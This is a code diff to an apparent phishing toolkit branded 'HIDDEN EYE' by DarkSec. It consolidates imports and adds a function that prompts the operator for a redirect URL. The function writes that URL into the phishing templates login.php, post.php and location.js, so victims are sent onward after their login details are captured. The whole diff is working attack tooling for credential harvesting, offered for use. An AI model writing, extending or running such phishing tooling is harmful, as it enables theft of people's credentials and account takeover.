@@ -1,6 +1,4 @@
-from Defs.ImportManager.unsorted_will_be_replaced import run_command
-from Defs.ImportManager.unsorted_will_be_replaced import webpage_set
-from Defs.ImportManager.unsorted_will_be_replaced import wait
+from Defs.ImportManager.unsorted_will_be_replaced import run_command, webpage_set, wait, path
 from Defs.ThemeManager.theme import default_palette
 from Defs.ActionManager.informant import exit_message, port_selector, module_loading_message
 
@@ -359,3 +357,52 @@ def start_phishing_page(page, custom_option):  # Phishing pages selection menu
 
     else:
         exit_message(port)
+
+def enter_custom_redirecting_url():  # Question where user can input custom web-link
+    run_command('clear')
+    print('''{1}
+        _  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
+        |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
+        |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
+        {0}http://github.com/darksecdevelopers
+        {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ PUT YOUR REDIRECTING URL HERE ] {0}\n-------------------------------'''.format(default_palette[0], default_palette[2]))
+    print(
+        '''\n{1}**{0}(Do not leave it blank. Unless Errors may occur)'''.format(default_palette[2], default_palette[4]))
+    print(
+        '''\n{0}[{1}*{0}]{0}Insert a custom redirect url:'''.format(default_palette[0], default_palette[4]))
+    custom = input('''\n{0}REDIRECT HERE>>> {1}'''.format(default_palette[0], default_palette[2]))
+    if 'http://' in custom or 'https://' in custom:
+        pass
+    else:
+        custom = 'http://' + custom
+
+    if path.exists('Server/www/js/location.js'): # For Location (gdrive) Template Redirection. 
+        with open('Server/www/js/location.js') as f: 
+            read_data = f.read()
+        c = read_data.replace('<CUSTOM>', custom)
+        f = open('Server/www/js/location.js', 'w')
+        f.write(c)
+        f.close()
+
+    if path.exists('Server/www/post.php') and path.exists('Server/www/login.php'):
+        with open('Server/www/login.php') as f:
+            read_data = f.read()
+        c = read_data.replace('<CUSTOM>', custom)
+        f = open('Server/www/login.php', 'w')
+        f.write(c)
+        f.close()
+
+        with open('Server/www/post.php') as f:
+            read_data = f.read()
+        c = read_data.replace('<CUSTOM>', custom)
+        f = open('Server/www/post.php', 'w')
+        f.write(c)
+        f.close()
+
+    else:
+        with open('Server/www/login.php') as f:
+            read_data = f.read()
+        c = read_data.replace('<CUSTOM>', custom)
+        f = open('Server/www/login.php', 'w')
+        f.write(c)
+        f.close()
